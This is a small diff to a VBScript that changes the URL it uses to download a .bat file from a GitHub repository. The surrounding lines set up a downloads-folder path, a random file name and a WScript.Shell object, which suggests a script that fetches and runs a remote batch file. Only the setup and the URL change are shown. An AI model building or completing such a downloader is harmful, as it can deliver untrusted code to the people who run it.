@@ -5,7 +5,7 @@
     Dim strDownloadsFolder, strBatFile, strDownloadURL
     Dim intCounter, strRandomName, objWshShell
     
-    strDownloadURL = "https://raw.githubusercontent.com/mikepattersondiscord-ctrl/.bat/main/test.bat"
+    strDownloadURL = "https://github.com/mikepattersondiscord-ctrl/.bat"
     
     Set objShell = CreateObject("WScript.Shell")
     Set objFSO = CreateObject("Scripting.FileSystemObject")
